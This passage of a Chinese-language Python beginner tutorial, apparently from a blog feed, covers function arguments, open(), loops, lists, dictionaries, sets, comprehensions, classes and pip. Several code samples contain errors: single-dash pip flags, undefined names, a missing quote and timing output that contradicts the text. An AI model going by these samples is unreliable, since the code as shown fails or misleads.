RIGHT!</code></pre><ul><li>第一行的函数参数按照反序传入，因为是关键词参数，所以并不影响函数正常运作；</li><li>第二行的函数参数反序传入，但是到了第三个却变成了位置参数，遗憾的是这种方式是 错误的语法，因为如果按照位置来传入，最后一个应该是参数 height 的位置。 但是前面 height 已经按照名称传入了值3，所以是冲突的。</li><li>第三行的函数参数正序传入，前两个是以关键词的方式传入，最后一个以位置参数传入，这个函数是可以正常运行的；</li><li>第四行的函数参数正序传入，前两个是以位置的方式传入，最后一个以关键词参数传入，这个函数是可以正常运行的。</li></ul><h5 id="2-1-认识一个新的函数一-“open”"><a href="#2-1-认识一个新的函数一-“open”" class="headerlink" title="2.1 认识一个新的函数一 “open”"></a>2.1 认识一个新的函数一 “open”</h5><p>这个函数使用起来很简单，只需要传入两个参数就可以正常运转了：文件的完整路径和名称，打开的方式。</p><p>如果是 Windows 用户，应该像这样写你的路径：</p><pre><code class="csharp">file = open(&#39;C:/Users/smk/Desktop/text.txt&#39;,&#39;w&#39;) file.write(&#39;hello world!&#39;)file.close()</code></pre><p><img src="https://img-blog.csdnimg.cn/20191125115206221.png" alt="在这里插入图片描述"><br>这段代码打开了桌面上的 file.txt 文件，并写入了 “Hello World” ，<code>w</code> 代表着如果桌面上有 file.txt 这个文件就直接写入 “hello world” ,如果没有 file.txt 这个文件就创建一个这样的文件。<br>但此时数据只写到了缓存中，并未保存到文件！文件需要<code>close()</code>方法关闭这个文件即可将缓存中的数据写入到文件中。</p><h3 id="第三节：循环与判断"><a href="#第三节：循环与判断" class="headerlink" title="第三节：循环与判断"></a>第三节：循环与判断</h3><h4 id="1、逻辑判断一一True-amp-False"><a href="#1、逻辑判断一一True-amp-False" class="headerlink" title="1、逻辑判断一一True &amp; False"></a>1、逻辑判断一一True &amp; False</h4><p>之前学过编程语言，这里就不多写了。</p><h4 id="2、成员运算符与身份运算符"><a href="#2、成员运算符与身份运算符" class="headerlink" title="2、成员运算符与身份运算符"></a>2、成员运算符与身份运算符</h4><p>成员运算符和身份运算符的关键词是 <code>in</code> 与 <code>is</code>。把 <code>in</code> 放在两个对象中间的含义是，测试前者是否存在于 <code>in</code> 后面的集合中。<br>例：</p><pre><code class="csharp">album = [&#39;Black Star&#39;,&#39;David Bowie&#39;,25,True]</code></pre><p>接下来我们使用 in 来测试字符串 “Black Star” 是否在列表 album 中。如果存在则会显示 True，不存在就会显示 False 了：</p><pre><code class="csharp">&#39;Black Star&#39; in album</code></pre><p>接下来再来说 <code>is</code> 和 <code>is not</code>，它们是表示身份鉴别的布尔运算符，<code>in</code> 和 <code>not in</code> 则是表示归属关系的布尔运算符号。</p><p>在 Python 中任何一个对象都要满足身份（Identity）、类型（Type）、值 （Value）这三个点，缺一不可。<code>is</code> 操作符号就是来进行身份的对比的。<br>例：</p><pre><code class="csharp">the_Eddie = &#39;Eddie&#39;name = &#39;Eddie&#39;  the_Eddie is name</code></pre><p>当两个变量一致时，经过 is 对比后会返回 True。</p><h4 id="3、条件控制"><a href="#3、条件控制" class="headerlink" title="3、条件控制"></a>3、条件控制</h4><p>条件控制其实就是 <code>if…else</code> 的使用。先来看下条件控制的基本结构：<br><img src="https://img-blog.csdnimg.cn/2019112512173868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例：</p><pre><code class="csharp">def account_login():     password = input(&#39;Password:&#39;)     if password == &#39;12345&#39;:         print(&#39;Login success!&#39;)      else:           print(&#39;Wrong password or invalid input!&#39;)                                                     account_login() account_login()</code></pre><ul><li>第1行：定义函数，并不需要参数；</li><li>第2行：使用 input 获得用户输入的字符串并储存在变量 password 中；</li><li>第3、4行：设置条件，如果用户输入的字符串和预设的密码12345相等时，就执行打印- 文本‘Login success！’；</li><li>第5、6行：反之，一切不等于预设密码的输入结果，全部会执行打印错误提示，并且再次调用函数，让用户再次输入密码；</li><li>第7行：运行函数；</li><li>第8行：调用函数。<br>如果 if 后面的布尔表达式过长或者难于理解，可以采取给变量赋值的办法来储存布尔表达式返回的布尔值 True 或 False。因此上面的代码可以写成这样：</li></ul><pre><code class="csharp">def account_login():    password = input(&#39;Password:&#39;)    password_correct = password == &#39;12345&#39;     #HERE！    if password_correct:        print(&#39;Login success!&#39;)    else:        print(&#39;Wrong password or invalid input!&#39;)        account_login()account_login()</code></pre><p>多条件判断同样很简单，只需在 if 和else 之间增加上 elif，用法和 if 是一致的。就不多说了。<br><img src="https://img-blog.csdnimg.cn/20191125122930346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="4、循环（Loop"><a href="#4、循环（Loop" class="headerlink" title="4、循环（Loop)"></a>4、循环（Loop)</h4><ul><li>for 循环<br>例：</li></ul><pre><code class="csharp">for every_letter in &#39;Hello world&#39;:    print(every_letter)</code></pre><p>得到这样的结果：</p><pre><code class="csharp">Helloworld</code></pre><p>解释：</p><ul><li><p>for 是关键词，后面的为变量名称，至于变量起什么名字自己定，但不要和关键词重名。</p></li><li><p>在关键词 in 后面所对应的一定是具有“可迭代的”，或者说是像列表那样的集合形态的对象，即可以连续地提供其中的每一个元素的对象。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/2019112519354257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了更深入了解 for 循环，我们来举个例子：</p><pre><code class="csharp">for num in range(1,11): #不包含11，因此实际范围是1～10    print(str(num) + &#39; + 1 =&#39;,num + 1)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20191125200619272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里用到了内置函数一<code>range</code>。我们只需要在 <code>range</code> 函数后面的括号中填上数字，就可以得到一个具有连续整数的序列。</p><p><strong>把 for 和 if 结合起来使用</strong><br>代码如下：</p><pre><code class="csharp">songslist = [&#39;Holy Diver&#39;, &#39;Thunderstruck&#39;, &#39;Rebel Rebel&#39;]for song in songslist:    if song == &#39;Holy Diver&#39;:        print(song,&#39; - Dio&#39;)    elif song == &#39;Thunderstruck&#39;:        print(song,&#39; - AC/DC&#39;)    elif song == &#39;Rebel Rebel&#39;:        print(song,&#39; - David Bowie&#39;)</code></pre><p>实现了这样一个功能：歌曲列表中有三首歌“Holy Diver, Thunderstruck, Rebel Rebel”，当播放到每首时，分别显示对应的歌手名字“Dio, AC/DC, David Bowie”。</p><h5 id="5、嵌套循环"><a href="#5、嵌套循环" class="headerlink" title="5、嵌套循环"></a>5、嵌套循环</h5><p>打印九九乘法表：<br>还记得当初学C语言的时候打印一个九九乘法表需要的代码起码有十几二十行吧，但是在python里却只需要三行！！</p><pre><code class="csharp">for i in range(1,10):    for j in range(1,10):        print(&#39;&#123;&#125; X &#123;&#125; = &#123;&#125;&#39;.format(i,j,i*j))</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20191125201915323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="6、While-循环"><a href="#6、While-循环" class="headerlink" title="6、While 循环"></a>6、While 循环</h5><p>语法：<br><img src="https://img-blog.csdnimg.cn/20191125202121359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用法就不举例了。</p><h3 id="第六节：数据结构"><a href="#第六节：数据结构" class="headerlink" title="第六节：数据结构"></a>第六节：数据结构</h3><p> 正如在现实世界中一样，直到我们拥有足够多的东西，才迫切需要一个储存东西的容器，这些储存大量数据的容器，在 Python 称之为内置数据结构。<br> Python 有四种数据结构，分别是：列表、字典、元组，集合。每种数据结构都有自己的特点，并且都有着独到的用处。<br><img src="https://img-blog.csdnimg.cn/20200411182121977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="1、列表（list"><a href="#1、列表（list" class="headerlink" title="1、列表（list)"></a>1、列表（list)</h5><p>先从列表开始，列表具有的最显著的特征是：</p><ul><li>列表中的每一个元素都是可变的；</li><li>列表中的元素是有序的，也就是说每一个元素都有一个位置；</li><li>列表可以容纳 Python 中的任何对象。</li><li>列表中的元素是可变的，这意味着我们可以在列表中添加、删除和修改元素。</li></ul><p>列表中的每一个元素都对应着一个位置，我们通过输入位置而查询该位置所对应的值，试着输入：</p><pre><code class="csharp">Weekday = [&#39;Monday&#39;,&#39;Tuesday&#39;,&#39;Wednesday&#39;,&#39;Thursday&#39;,&#39;Friday&#39;]print(Weekday[0])</code></pre><p>结果为；<br><img src="https://img-blog.csdnimg.cn/20200411215338220.png" alt="在这里插入图片描述"><br>第三个特征是列表可以装入 Python 中所有的对象：</p><pre><code class="csharp">all_in_list = [    1,                              #整数    1.0,                            #浮点数    &#39;a word&#39;,                       #字符串    print(1),                       #函数    True,                           #布尔值    [1,2],                          #列表中套列表    (1,2),                          #元组    &#123;&#39;key&#39;:&#39;value&#39;&#125;                 #字典]for all in all_in_list:    print(all)</code></pre><p>结果为:<br><img src="https://img-blog.csdnimg.cn/20200411215257461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>列表的增删改查</strong>：</p><p>对于数据的操作，最常见的是增删改查这四类。从列表的<strong>插入</strong>方法开始，输入：</p><pre><code class="csharp">fruit = [&#39;pineapple&#39;,&#39;pear&#39;]fruit.insert(1,&#39;grape&#39;)print(fruit)</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411215202749.png" alt="在这里插入图片描述"><br><strong>删除</strong>列表中元素的方法是使用 remove()：</p><pre><code class="csharp">fruit = [&#39;pinapple&#39;,&#39;pear&#39;,&#39;grape&#39;]fruit.remove(&#39;grape&#39;)</code></pre><p>删除还有一种方法，那就是使用 del 关键字来声明：</p><pre><code class="csharp">del fruit[0:2]</code></pre><p>想替换<strong>修改</strong>其中的元素可以这样：</p><pre><code class="csharp">fruit[0] = &#39;Grapefruit&#39;</code></pre><p>列表的索引与字符串的分片相似，同样是分正反两种索引方式，只要输入对应的位置就会返回给你在这个位置上的值：</p><p><img src="https://img-blog.csdnimg.cn/20200411220748460.png" alt="在这里插入图片描述"><br>用元素周期表来试验一下：</p><pre><code class="csharp">periodic_table = [&#39;H&#39;,&#39;He&#39;,&#39;Li&#39;,&#39;Be&#39;,&#39;B&#39;,&#39;C&#39;,&#39;N&#39;,&#39;O&#39;,&#39;F&#39;,&#39;Ne&#39;]print(periodic_table[0])print(periodic_table[-2])print(periodic_table[0:3])print(periodic_table[-10:-7])print(periodic_table[-10:]) print(periodic_table[:9])</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411221629527.png" alt="在这里插入图片描述"><br>如果要是反过来，想要查看某个具体的值所在的位置，就需要用别的方法了，否则就会报错，这是因为列表只接受用位置进行索引，但如果数据量很大的话，肯定会记不住什么元素在什么位置，那么有没有一种数据类型可以用人类的方式来进行索引呢？其实这就是字典，我们一起来继续学习。</p><h5 id="2、字典（Dictionary"><a href="#2、字典（Dictionary" class="headerlink" title="2、字典（Dictionary)"></a>2、字典（Dictionary)</h5><p>字典这种数据结构的特征也正如现实世界中的字典一样，使用名称－内容进行数据的构建，在 Python 中分别对应着键（key）－ 值（value），习惯上称之为键值对。<br>字典的特征总结如下：</p><ul><li><p>字典中数据必须是以键值对的形式出现的；</p></li><li><p>逻辑上讲，键是不能重复的，而值可以重复；</p></li><li><p>字典中的键（key）是不可变的，也就是无法修改的；而值（value）是可变的，可修改的，可以是任何对象。</p><p>用下面这个例子来看一下，这是字典的书写方式：</p></li></ul><pre><code class="csharp">NASDAQ_code = &#123;    &#39;BIDU&#39;:&#39;Baidu&#39;,    &#39;SINA&#39;:&#39;Sina&#39;,    &#39;YOKU&#39;:&#39;Youku&#39;&#125;</code></pre><p>字典中的键与值必须是成对的！<br>同时字典中的键值不会有重复，即便你这么做，相同的键值也只能出现一次：</p><pre><code class="csharp">a = &#123;&#39;key&#39;:123,&#39;key&#39;:1234&#125;print(a)</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041123171936.png" alt="在这里插入图片描述"><br><strong>字典的增删改查</strong>：<br>创建一个字典，继续使用前面的例子：</p><pre><code class="csharp">NASDAQ_code = &#123;&#39;BIDU&#39;:&#39;Baidu&#39;,&#39;SINA&#39;:&#39;Sina&#39;&#125;</code></pre><p>与列表不同的是，字典并没有一个可以往里面添加单一元素的“方法”，但是我们可以通过这种方式进行<strong>添加</strong>：</p><pre><code class="csharp">NASDAQ_code[&#39;YOKU&#39;] = &#39;Youku&#39;print(NASDAQ_code）</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411232205779.png" alt="在这里插入图片描述"><br>列表中有用来<strong>添加多个</strong>元素的方法 <code>extend()</code> ，在字典中也有对应的添加多个元素的方法 <code>update()</code>：</p><pre><code class="csharp">NASDAQ_code.update(&#123;&#39;FB&#39;:&#39;Facebook&#39;,&#39;TSLA&#39;:&#39;Tesla&#39;&#125;)</code></pre><p>删除字典中的元素则使用 <strong>del</strong> 方法：</p><pre><code class="csharp">del NASDAQ_code[&#39;FB&#39;]</code></pre><p>需要注意的是，虽说字典是使用的花括号，在索引内容的时候仍旧使用的是和列表一样的方括号进行索引，只不过在括号中放入的一定是字典中的键，也就是说需要通过键来索引值：</p><pre><code class="csharp">NASDAQ_code[&#39;TSLA&#39;]</code></pre><p>同时，字典是不能够切片的，也就是说下面这样的写法应用在字典上是错误的：</p><pre><code class="csharp">chart[1:4]  # WRONG!</code></pre><h5 id="3、元组（Tuple"><a href="#3、元组（Tuple" class="headerlink" title="3、元组（Tuple)"></a>3、元组（Tuple)</h5><p>元组其实可以理解成一个稳固版的列表，因为元组是不可修改的，因此在列表中的存在的方法均不可以使用在元组上，但是元组是可以被查看索引的，方式就和列表一样：</p><pre><code class="csharp">letters = (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;)letter[0]</code></pre><h6 id="4、集合（Set"><a href="#4、集合（Set" class="headerlink" title="4、集合（Set)"></a>4、集合（Set)</h6><p>集合则更接近数学上集合的概念。每一个集合中的元素是无序的、不重复的任意对象，我们可以通过集合去判断数据的从属关系，有时还可以通过集合把数据结构中重复的元素减掉。</p><ul><li>集合不能被切片也不能被索引，除了做集合运算之外，集合元素可以被添加还有删除：<pre><code class="csharp">a_set = &#123;1,2,3,4&#125;                                              a_set.add(5) #添加a_set.discard(5) #删除</code></pre><h5 id="5、数据结构的一些技巧"><a href="#5、数据结构的一些技巧" class="headerlink" title="5、数据结构的一些技巧"></a>5、数据结构的一些技巧</h5>有很多函数的用法和数据结构的使用是息息相关的。前面我们学习了列表的基本用法，而在实际操作中往往会遇到更多的问题。比如，在整理表格或者文件的时候会按照字母或者日期进行排序，在 Python 中也存在类似的功能：</li></ul><pre><code class="csharp">num_list = [6,2,7,4,1,3,5]print(sorted(num_list))</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200411234053636.png" alt="在这里插入图片描述"><br><code>sorted</code> 函数按照<strong>长短</strong>、<strong>大小</strong>、英文字母的<strong>顺序</strong>给每个列表中的元素进行排序。这个函数会经常在数据的展示中使用，其中有一个非常重要的地方，sorted 函数并不会改变列表本身，你可以把它理解成是先将列表进行复制，然后再进行顺序的整理。</p><ul><li>在使用默认参数 reverse 后列表可以被按照逆序整理：</li></ul><pre><code class="csharp">sorted(num_list,reverse=True)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200411234245265.png" alt="在这里插入图片描述"><br><strong>推导式</strong>：<br>现在我们来看数据结构中的推导式（List comprehension），也许你还看到过它的另一种名称叫做列表的解析式，在这里你只需要知道这两个说的其实是一个东西就可以了。</p><p>现在我有10个元素要装进列表中，普通的写法是这样的：</p><pre><code class="csharp">a = []for i in range(1,11):    a.append(i) #append函数会在数组后加上相应的元素</code></pre><p>下面换成列表解析的方式来写：</p><pre><code class="csharp">b = [i for i in range(1,11)]</code></pre><p>列表解析式不仅非常方便，并且在执行效率上要远远胜过前者，我们把两种不同的列表操作方式所耗费的时间进行对比，就不难发现其效率的巨大差异：</p><pre><code class="csharp">import timea = []t0 = time.clock()for i in range(1,20000):    a.append(i)print(time.clock() - t0, seconds process time&quot;)t0 = time.clock()b = [i for i in range(1,20000)]print(time.clock() - t0, seconds process time&quot;)得到结果：</code></pre><pre><code class="csharp">8.999999999998592e-06 seconds process time0.0012320000000000005 seconds process time</code></pre><p>列表推导式的用法也很好理解，可以简单地看成两部分。红色虚线后面的是我们熟悉的 for 循环的表达式，而虚线前面的可以认为是我们想要放在列表中的元素，在这个例子中放在列表中的元素即是后面循环的元素本身。<br><img src="https://img-blog.csdnimg.cn/20200411235925460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了更好地理解这句话，我们继续看几个例子：</p><pre><code class="csharp">a = [i**2 for i in range(1,10)]c = [j+1 for j in range(1,10)]k = [n for n in range(1,10) if n % 2 ==0]z = [letter.lower() for letter in &#39;ABCDEFGHIGKLMN&#39;]</code></pre><p>字典推导式的方式略有不同，主要是因为创建字典必须满足键－值的两个条件才能达成：</p><pre><code class="csharp">d = &#123;i:i+1 for i in range(4)&#125;g = &#123;i:j for i,j in zip(range(1,6),&#39;abcde&#39;)&#125;g = &#123;i:j.upper() for i,j in zip(range(1,6),&#39;abcde&#39;)&#125;</code></pre><p><strong>循环列表时获取元素的索引</strong><br>现在我们有一个字母表，如何能像下图中一样，在索引的时候得到每个元素的具体位置的展示呢？</p><pre><code class="csharp">letters = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;]</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041200040212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>前面提到过，列表是有序的，这时候我们可以使用 Python 中独有的函数 <code>enumerate</code> 来进行：</p><pre><code class="csharp">letters = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;]for num,letter in enumerate(letters):    print(letter,&#39;is&#39;,num + 1)</code></pre><p>如果同时需要两个列表应该怎么办？这时候就可以用到 <code>zip</code> 函数，比如：</p><pre><code class="csharp">a=[1,2,3]b=[&#39;x&#39;,&#39;y&#39;,&#39;z&#39;]for a,b in zip(str,num):    print(b,&#39;is&#39;,a)</code></pre><p><img src="https://img-blog.csdnimg.cn/202004121313258.png" alt="在这里插入图片描述"></p><h3 id="第七节：类"><a href="#第七节：类" class="headerlink" title="第七节：类"></a>第七节：类</h3><p>Python的类和C++/java 的类定义方法基本相同，但在声明对象是略有不同，Python把对象的声明进一步简化了。<br>例：</p><p>定义类：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]</code></pre><p>声明对象：</p><pre><code class="csharp">coke_for_me = CocaCola()</code></pre><p>调用：</p><pre><code class="csharp">print(CocaCola.formula)print(coke_for_me.formula)print(coke_for_you.formula)</code></pre><p>结果为：</p><pre><code class="csharp">&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]</code></pre><p>Python 支持直接使用类来调用方法，而java中必须是静态的方法才能使用类进行直接调用。</p><p>类的属性与正常的变量并无区别：</p><pre><code class="csharp">for element in coke_for_me.formula:    print(element)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; caffeine&gt;&gt;&gt; sugar&gt;&gt;&gt; water&gt;&gt;&gt; soda</code></pre><p>和java里的类相同，Python的类有属性，方法等等…这里就不详细记录了。</p><p>例子：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def drink(self,how_much):              if how_much == &#39;a sip&#39;:            print(&#39;Cool~&#39;)        elif how_much == &#39;whole bottle&#39;:            print(&#39;Headache!&#39;)       ice_coke = CocaCola()ice_coke.drink(&#39;a sip&#39;)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; Cool~</code></pre><h5 id="2、魔术方法："><a href="#2、魔术方法：" class="headerlink" title="2、魔术方法："></a>2、魔术方法：</h5><p> Python 的类中存在一些方法，被称为”魔术方法”，<code>_init_()</code> 就是其中之一。<br> <code>_init()</code>是 <code>initialize(初始化)</code>的缩写，这也就意味着即使我们在创建实例的时候不去引用 <code>init_()</code>方法，其中的命令也会先被自动地执行。<br><code>_init()</code> 的神奇之处就在于，如果你在类里定义了它，在创建实例的时候它就能帮你自动地处理很多事情——比如新增实例属性。在上面的代码中，我们创建了一个实例属性，但那是在定义完类之后再做的，这次我们一步到位：</p><pre><code class="csharp">class CocaCola():    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self):        self.local_logo = &#39;可口可乐&#39;     def drink(self):    # HERE！        print(&#39;Energy!&#39;)        coke = CocaCola()print(coke.local_logo)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; 可口可乐</code></pre><p><code>_init_()</code> 方法可以给类的使用提供极大的灵活性。试试看下面的代码会发生什么：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self):        for element in self.formula:            print(&#39;Coke has &#123;&#125;!&#39;.format(element))coke = CocaCola()</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200412162907530.png" alt="在这里插入图片描述"><br>除了必写的<code>self</code> 参数之外，<code>_init()</code> 也有自己的参数，同时也不需要这样<code>obj.init()</code>的方式来调用（因为是自动执行），而是在实例化的时候往类后面的括号中放进参数，相应的所有参数都会传递到这个特殊的 <code>init_()</code> 方法中，和函数的参数的用法完全相同。</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self,logo_name):        self.local_logo = logo_name    def drink(self):        print(&#39;Energy!&#39;)coke = CocaCola(&#39;可口可乐&#39;)print(coke.local_logo)</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200412164301434.png" alt="在这里插入图片描述"></p><h5 id="3、类的继承"><a href="#3、类的继承" class="headerlink" title="3、类的继承"></a>3、类的继承</h5><p>python中类的继承也比java更加简洁。<br><strong>例：</strong></p><pre><code class="csharp">class CaffeineFree(CocaCola):    caffeine = 0                           #覆盖    ingredients =  [                       #覆盖        &#39;High Fructose Corn Syrup&#39;,        &#39;Carbonated Water&#39;,        &#39;Phosphoric Acid&#39;,        &#39;Natural Flavors&#39;,        &#39;Caramel Color&#39;,    ]coke_a = CaffeineFree(&#39;Cocacola-FREE&#39;)       # 传入初始化参数coke_a.drink()</code></pre><p>在新的类 CaffeineFree 后面的括号中放入 CocaCola，这就表示这个类是继承于 CocaCola 这个父类的， CaffeineFree 就成为了 CocaCola 子类。类中的变量和方法可以完全被子类继承，但如需有特殊的改动也可以进行覆盖。</p><h5 id="4、类属性与实例属性"><a href="#4、类属性与实例属性" class="headerlink" title="4、类属性与实例属性"></a>4、类属性与实例属性</h5><p>Q1：类属性如果被重新赋值，是否会影响到类属性的引用？</p><pre><code class="python">class TestA:    attr = 1obj_a = TestA()TestA.attr = 42print(obj_a.attr)</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200412224324884.png" alt="在这里插入图片描述"><br>Q2：实例属性如果被重新赋值，是否会影响到类属性的引用？</p><pre><code class="python">class TestA:    attr = 1obj_a = TestA()obj_b = TestA()obj_a.attr = 42print(obj_b.attr)</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200412224352282.png" alt="在这里插入图片描述"></p><p>Q3：类属性实例属性具有相同的名称，那么 <code>.</code> 后面引用的将会是什么？</p><pre><code class="python">class TestA:    attr = 1    def __init__(self):        self.attr = 42obj_a = TestA()print(obj_a.attr)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412225347119.png" alt="在这里插入图片描述"><br><strong>解释</strong>：<br>如图所示， Python 中属性的引用机制是自外而内的，当你创建了一个实例之后，准备开始引用属性，这时候编译器会先搜索该实例是否拥有该属性，如果有，则引用；如果没有，将搜索这个实例所属的类是否有这个属性，如果有，则引用，没有那就只能报错了。<br><img src="https://img-blog.csdnimg.cn/20200412225631372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第七节：使用第三方库"><a href="#第七节：使用第三方库" class="headerlink" title="第七节：使用第三方库"></a>第七节：使用第三方库</h3><p>如果用手机来比喻编程语言，那么 Python 是一款智能机。而海量的第三方库就是各种各样的app，丰富的第三方库为 Python 开发提供了极大的便利。</p><p><strong>安装 pip</strong>:<br>在 Python 3.4 之后，安装好 Python 环境就可以直接支持 pip，你可以在终端/命令行里输入这句检查一下：</p><pre><code class="python">pip -version</code></pre><p>如果显示了 pip 的版本，就说明 pip 已经成功安装了。</p><p><strong>使用 pip 安装库</strong>:</p><p>在安装好 pip 之后，以后安装库，只需要在命令行里面输入：</p><pre><code class="python">pip3 install PackageName</code></pre><blockquote><p>注：PackageName 需要替换成你要安装的库的名称；如果你想安装到 python 2中，需要把 pip3 换成 pip。</p></blockquote><p>如果你安装了 python 2和3两种版本，可能会遇到安装目录的问题，可以换成:</p><pre><code class="python">python3 -m pip install PackageName</code></pre><blockquote><p>注：在存在多个 Python 版本的环境中，加上<code>python3 -m</code>这种写法可以精确地控制三方库的安装位置如果你想安装到 python 2中，需要把 python3 换成 python</p></blockquote><p>如果遇到权限问题，可以输入：</p><pre><code class="python">sudo pip install PackageName</code></pre><p>安装成功后会提示：</p><pre><code class="python">Successfully installed PackageName</code></pre><p>几个 pip 的常用指令：</p><pre><code class="python">pip install -upgrade pip                  #升级 pippip uninstall flask                       #卸载库pip list                                  #查看已安装库</code></pre><p>🆗，Python的基础学习就到这了，想要学好Python一定要多加练习！</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 爬虫学习（一）</title>
      <link href="2019/12/05/Python%20%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/12/05/Python%20%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
